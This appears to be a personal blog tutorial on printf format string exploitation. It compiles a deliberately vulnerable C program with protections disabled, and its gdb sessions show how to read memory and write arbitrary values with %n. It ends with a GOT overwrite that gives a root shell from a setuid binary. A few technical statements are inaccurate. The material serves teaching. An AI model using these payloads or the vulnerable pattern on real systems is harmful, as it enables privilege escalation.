---
layout: post
title: subverting-printf
excerpt: "Using malformed printf statements to arbitrarily read and write memory."
categories: [tech]
tags: [itsec, howto]
comments: false
---

To follow this post you may need a modicum of C know-how as well as some familiarity with `gdb`. In regards to compile flags, we're using `-g` to include debugging information (which will be used by `gdb`) and `-m32` to compile to 32 bits (I'm using a 64 bits machine and you probably are too) - but 32 bit is easier to understand. 

I'll also be using the `-fno-stack-protector` option which is enabled by default on modern versions of `gdb` and ASLR (Address Space Layout Randomisation) has been disabled via `sudo echo 0 | tee /proc/sys/kernel/randomize_va_space` and making the stack executable with `-z execstack`.

Note that I am supressing warnings with the `-w` flag - that's intentional and solely for the purpose of this exercise!

## `printf` calling convention

Let's start by looking at how `printf` is called from an assembly perspective. Here's the `C` code:

~~~ c
#include <stdlib.h>

int
main(int argc, char* argv[])
{
  unsigned int var = 0xAAAAAAAA;
  char buffer[512];
  strcpy(buffer, argv[1]);

  printf("Caller passed in string %s, var is located at 0x%08x", buffer, &var);
  printf("\n");

  exit(0);
}
~~~

Let's compile that and check the corresponding assembly in `gdb`:

~~~ shell
vagrant@vagrant:~/scratch$ gcc -m32 -g -fno-stack-protector -w printf_c.c
vagrant@vagrant:~/scratch$ gdb -q ./a.out
Reading symbols from ./a.out...done.
(gdb) list 10
5       main(int argc, char* argv[])
6       {
7         unsigned int var = 0xAAAAAAAA;
8         char buffer[512];
9         strcpy(buffer, argv[1]);
10
11        printf("Caller passed in string %s, var is located at 0x%08x", buffer, &var);
12        printf("\n");
13
14        exit(0);
(gdb) break 11
Breakpoint 1 at 0x80484d3: file printf_c.c, line 11.
(gdb) set disassemble-next-line on
(gdb) run foo
Starting program: /home/vagrant/scratch/a.out foo

Breakpoint 1, main (argc=2, argv=0xffffdc24) at printf_c.c:11
11        printf("Caller passed in string %s, var is located at 0x%08x", buffer, &var);
=> 0x080484d3 <main+56>:        83 ec 04                sub    esp,0x4
   0x080484d6 <main+59>:        8d 45 f4                lea    eax,[ebp-0xc]
   0x080484d9 <main+62>:        50                      push   eax
   0x080484da <main+63>:        8d 85 f4 fd ff ff       lea    eax,[ebp-0x20c]
   0x080484e0 <main+69>:        50                      push   eax
   0x080484e1 <main+70>:        68 90 85 04 08          push   0x8048590
   0x080484e6 <main+75>:        e8 55 fe ff ff          call   0x8048340 <printf@plt>
   0x080484eb <main+80>:        83 c4 10                add    esp,0x10
~~~ 

We see that we push 3 things on top of the stack before the `call`. Let's see those in more details:

~~~ shell
(gdb) break *0x080484e6
Breakpoint 2 at 0x80484e6: file printf_c.c, line 11.
(gdb) set disassemble-next-line off
(gdb) c
Continuing.

Breakpoint 2, 0x080484e6 in main (argc=2, argv=0xffffdc24) at printf_c.c:11
11        printf("Caller passed in string %s, var is located at 0x%08x", buffer, &var);
(gdb) x/4wx $esp
0xffffd950:     0x08048590      0xffffd96c      0xffffdb6c      0xf7fefe7a
(gdb) x/s 0x08048590
0x8048590:      "Caller passed in string %s, var is located at 0x%08x"
(gdb) x/s 0xffffd96c
0xffffd96c:     "foo"
(gdb) x/x 0xffffdb6c
0xffffdb6c:     0xaa
(gdb) x/4x 0xffffdb6c
0xffffdb6c:     0xaa    0xaa    0xaa    0xaa
~~~

As we can see, we have 3 addresses - each corresponding to an argument given to `printf`. The string to be interpolated is pushed first, and the arguments next.

`printf` takes a variable number of arguments thought. So how does it know what to look for on the stack? It parses the format string.

## Reading arbitrary addresses

As we saw above, `printf` expects all its arguments (determined by the format string) to be on the stack - and when they're passed in properly that works just fine. But sometimes people are forgetfull and end up doing the following:

~~~ c
#include <stdlib.h>
#include <stdio.h>

int
main(int argc, char* argv[])
{
  char buffer[512];
  strcpy(buffer, argv[1]);

  printf(buffer);
  printf("\n");

  exit(0);
}
~~~

Which works as expected *as long as* the caller does not include a format string:

~~~ shell
vagrant@vagrant:~/scratch$ gcc -m32 -g -fno-stack-protector -w printf_c.c
vagrant@vagrant:~/scratch$ ./a.out hello
hello
vagrant@vagrant:~/scratch$ ./a.out hello%08x
helloffb5ad8b
~~~

So what just happened? `printf` parsed the format string and decided it needed an extra argument - and just took the next item on the stack and displayed it as a 4-bytes word. Let's try that again with a more contrived example:

~~~ shell
vagrant@vagrant:~/scratch$ ./a.out DDDD$(perl -e "print '%p..'x12")
DDDD0xffdf3d60..0xf77d8f1c..0xf77cbe7a..0x8..0xf77cbe66..0xf77d9000..0x44444444..0x2e2e7025..0x2e2e7025..0x2e2e7025..0x2e2e7025..0x2e2e7025..
~~~

The `0x44444444` looks suspicious, and so does the repeating `0x2e2e7025`. Sure enough:

~~~ shell
vagrant@vagrant:~/scratch$ printf "\x44\x44\x44\x44\n"
DDDD
vagrant@vagrant:~/scratch$ printf "\x2e\x2e\x70\x25\n"
..p%
~~~

Do remember we're using little-endian, so the bytes are printed backwards. Unlike the first example where the format string was located at `0x08048590`, this time *it has been placed fully on the stack*! And as we walk down the stack we encounter what we put on it - meaning we can force `printf` to use our input as arguments.

This unfortunately means we cannot read past our input using `%p` - but we can trick `printf` into reading a string at a memory location of our choosing. If we use the `%s` format, `printf` will use what's on the stack  as the address of a string and will read until a null byte is found. But what shall we read? Let's try an environment variable.

Now `gdb` does some funky stuff meaning the environment we execute under differs to the one outside. Thankfully there's something we can do about it but it's a little messy (I'm sure there *must* be a better way). We'll use `env -i` to ignore the current environment. Let's also figure out where we need to place our `%s`:

~~~ shell
vagrant@vagrant:~/scratch$ /home/vagrant/scratch/a.out $(python -c 'print "DDDD" + "%p.."*5')
DDDD0xffffdd54..0xf7ffd000..0xf7fefec9..0x44444444..0x2e2e7025..
~~~

This means we should have 3 `%p` before adding our `%s` - which, as it stands, would cause `printf` to try and read the string located at `0x44444444` which sure enough, segfaults:

~~~ shell
vagrant@vagrant:~/scratch$ /home/vagrant/scratch/a.out $(python -c 'print "DDDD" + "%p.."*3 + "%s"')
Segmentation fault (core dumped)
~~~

We need to figure out where our environment variable is located:

~~~ shell
vagrant@vagrant:~/scratch$ env -i PWD=$(pwd) SOME_VAR=foobar gdb -q --args /home/vagrant/scratch/a.out $(python -c 'print "DDDD" + "%p.."*3 + "%s"')
Reading symbols from /home/vagrant/scratch/a.out...done.
(gdb) show env
PWD=/home/vagrant/scratch
SOME_VAR=foobar
LINES=29
COLUMNS=211
~~~

Despite `env -i`, `gdb` still added stuff! Okay let's add that to our environment too.

~~~ shell
vagrant@vagrant:~/scratch$ env -i PWD=$(pwd) SOME_VAR=foobar LINES=29 COLUMNS=211 gdb -q --args /home/vagrant/scratch/a.out $(python -c 'print "DDDD" + "%p.."*3 + "%s"')
Reading symbols from /home/vagrant/scratch/a.out...done.
(gdb) show env
PWD=/home/vagrant/scratch
SOME_VAR=foobar
LINES=29
COLUMNS=211
(gdb) break main
Breakpoint 1 at 0x80484b1: file printf_c.c, line 8.
(gdb) r
Starting program: /home/vagrant/scratch/a.out DDDD%p..%p..%p..%s

Breakpoint 1, main (argc=2, argv=0xffffde84) at printf_c.c:8
8         strcpy(buffer, argv[1]);
(gdb) x/4s *environ
0xffffdf9d:     "SOME_VAR=foobar"
0xffffdfad:     "COLUMNS=211"
0xffffdfb9:     "PWD=/home/vagrant/scratch"
0xffffdfd3:     "LINES=29"
(gdb) p/x 0xffffdf9d+9
$1 = 0xffffdfa6
~~~

Again `gdb` makes things a little more difficult - the order of the variables differs from the one we specified. It just means we need to call our binary with the vars in that order - and `SOME_VAR` will be located at `0xffffdf9d` + 9 bytes (one for each character of `SOME_VAR=`). We're now ready to run this:

~~~ shell
vagrant@vagrant:~/scratch$ env -i SOME_VAR=foobar COLUMNS=211 LINES=29 PWD=/home/vagrant/scratch /home/vagrant/scratch/a.out $(python -c 'print "\xa6\xdf\xff\xff" + "%p.."*3 + "%s"')
▒▒0xffffdf8a..0xf7ffd000..0xf7fefec9..foobar
~~~

Success!

The astute reader would have pointed out this would have been *much* simpler using `getenv` but I was hell bent on getting this to work with `gdb`. Heh.

## Writing to an arbitrary address

`printf` has a little known format parameter - `%n` - that writes the number of bytes written so far. The argument it takes is a memory address - something we know we can control.

~~~ c
#include <stdlib.h>
#include <stdio.h>

int
main(int argc, char* argv[])
{
  unsigned int var = 0xAAAAAAAA;
  char buffer[512];
  strcpy(buffer, argv[1]);
  printf(buffer);
  printf("\n");
  printf("var = 0x%08x and is located at %p\n", var, &var);
  exit(0);
}
~~~

We can see use this to overwrite an address with a different value:

~~~ shell
vagrant@vagrant:~/scratch$ /home/vagrant/scratch/a.out $(python -c 'print "DDDD"+"%08x"*6 + "%p"')
DDDDffffdd20f7ffcf1cf7fefe7a00000008f7fefe66f7ffd0000x44444444
var = 0xaaaaaaaa and is located at 0xffffdb1c
vagrant@vagrant:~/scratch$ /home/vagrant/scratch/a.out $(python -c 'print "\x1c\xdb\xff\xff"+"%08x"*6 + "%n"')
▒ffffdd20f7ffcf1cf7fefe7a00000008f7fefe66f7ffd000
var = 0x00000034 and is located at 0xffffdb1c
~~~

The `%n` modifier writes 32 bits which is a little unwildly. We can use `h` to write half (16 bits) instead.

~~~ shell
vagrant@vagrant:~/scratch$ /home/vagrant/scratch/a.out $(python -c 'print "\x1c\xdb\xff\xff"+"%08x"*6 + "%hn"')
▒ffffdd1ff7ffcf1cf7fefe7a00000008f7fefe66f7ffd000
var = 0xaaaa0034 and is located at 0xffffdb1c
~~~

Instead of overwriting the target address with a 32 bit value, we'll overwrite the upper and lower halves separately. This means we'll use 2 `%hn` modifiers - the first will write to `<address>` and the second to `<address+2>` - for a total of 32 bits.

`printf` can also take positional arguments - so `printf("$2s, $1s", "first arg", "second arg")` would print `second arg, first arg`. We will replace the `%08x` padding with this - it's equivalent (as in `printf` will jump down the stack) and saves space in the format string (in case our user input is limited). After some trial and error we have:

~~~ shell
vagrant@vagrant:~/scratch$ /home/vagrant/scratch/a.out $(python -c 'print "DDDDEEEE" + "%00000x%7$p%00000x%8$p"')
DDDDEEEEffffdd200x44444444f7ffcf1c0x45454545
var = 0xaaaaaaaa and is located at 0xffffdb1c
~~~

So our addresses are located at the 7th and 8th position. We replace `p` with `hn` and as expected we get a seg fault - the addresses`0x44444444` and `0x45454545` are not ours.

~~~ shell
vagrant@vagrant:~/scratch$ /home/vagrant/scratch/a.out $(python -c 'print "DDDDEEEE" + "%00000x%7$hn%00000x%8$hn"')
Segmentation fault (core dumped)
~~~

We use `var`'s address instead:

~~~ shell
vagrant@vagrant:~/scratch$ /home/vagrant/scratch/a.out $(python -c 'print "\x1c\xdb\xff\xff\x1e\xdb\xff\xff" + "%00000x%7$hn%00000x%8$hn"')
▒▒ffffdd1ef7ffcf1c
var = 0x00180010 and is located at 0xffffdb1c
~~~

Okay - getting there. We know that by the time we get to the first `hn` we would have already written 8 bytes - so we want to write an additional `0xdd5a - 8` for the first part and `0xffff - 0xdd5a` for the second:

~~~ shell
(gdb) p 0xdd5a - 8
$42 = 56658
(gdb) p 0xffff - 0xdd5a
$43 = 8869
~~~

And we see that it does work:

~~~ shell
vagrant@vagrant:~/scratch$ /home/vagrant/scratch/a.out $(python -c 'print "\x1c\xdb\xff\xff\x1e\xdb\xff\xff" + "%56658x%7$hn%08869x%8$hn"')
var = 0xffffdd5a and is located at 0xffffdb1c
~~~

Now instead of writing this to `var`'s address, we need something useful. There's no point printing our shellcode to screen. Simliar to a buffer overflow we want to override something exectuable - and it turns out there's just the thing. Our binary calls a number of functions defined in `libc`. In our case we call `exit` at the end. We can see where the address for that function gets loaded - and by overwriting that with the address of our shellcode, we can get this executed instead:

~~~ shell
vagrant@vagrant:~/scratch$ objdump -R a.out | grep exit
0804a014 R_386_JUMP_SLOT   exit@GLIBC_2.0
~~~

Assuming our executable was owned by root and had the sticky bit set, we'd get an escalated shell:

~~~ shell
vagrant@vagrant:~/scratch$ sudo chown root a.out
vagrant@vagrant:~/scratch$ sudo chmod u+s a.out
vagrant@vagrant:~/scratch$ id
uid=1000(vagrant) gid=1000(vagrant) groups=1000(vagrant),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
vagrant@vagrant:~/scratch$ /home/vagrant/scratch/a.out $(python -c 'print "\x14\xa0\x04\x08\x16\xa0\x04\x08" + "%56658x%7$hn%08869x%8$hn"')
...
var = 0xaaaaaaaa and is located at 0xffffdb1c
# id
uid=0(root) gid=1000(vagrant) groups=1000(vagrant),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
~~~

## Conclusion and references

Don't forget that your shellcode is still on the stack - and it needs to be executable!

  * [CS155](https://crypto.stanford.edu/cs155/papers/formatstring-1.2.pdf) at Standford
  * [printf format string exploitation](https://systemoverlord.com/2014/02/12/printf-format-string-exploitation/) on System Overlord
  * JBremer's post on [format string vulnerabilities](http://jbremer.org/format-string-vulnerabilities/#fmtstr-calc-offsets)
  * Code Arcana's introduction to [format string exploits](http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html)
